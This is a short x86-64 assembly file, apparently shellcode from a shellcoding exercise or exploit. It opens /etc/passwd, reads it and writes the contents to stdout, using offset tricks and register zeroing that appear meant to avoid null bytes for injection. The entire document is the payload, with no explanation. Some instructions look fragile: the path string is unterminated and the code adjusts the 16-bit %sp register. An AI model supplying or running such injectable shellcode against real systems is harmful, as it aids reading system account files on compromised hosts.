		.global _start

		.text
_start:
		# open(/etc/passwd)
		xor		%rbp, %rbp
		xor		%rdx, %rdx
		# sub 	$24, %rsp
		lea		path+0x4444401(%rip), %rdi
		sub		$0x4444401, %rdi

		movq 	(%rdi), %rax
		movq 	%rax, (%rsp)

		movq 	0x3(%rdi), %rax
		movq 	%rax, 0x3(%rsp)
		movq 	%rsp, %rdi

		# xorb	$0x41, (%rdi)
		xor  	%rax, %rax
		mov		$2, %al
		xor    	%rsi,%rsi
		syscall

		# read(/etc/passwd)		
		sub 	$0xfff, %sp
		lea 	(%rsp), %rsi
		mov 	%rax, %rdi
		xor 	%rax, %rax
		mov		$0xfff,%dl
		syscall

		# write(/etc/passwd)
		xor		%rax, %rax                  # system call 1 is write
		inc		%rax
        mov		%rax, %rdi		    		# file handle 1 is stdout              
	    # mov		%rsp, %rsi
		mov		$0xfff,%dl               	    # number of bytes
        syscall 

		
		# exit(0)
		mov		$60, %al
		xor 	%rdi, %rdi
		syscall

path:
		.ascii	"/etc/passwd"
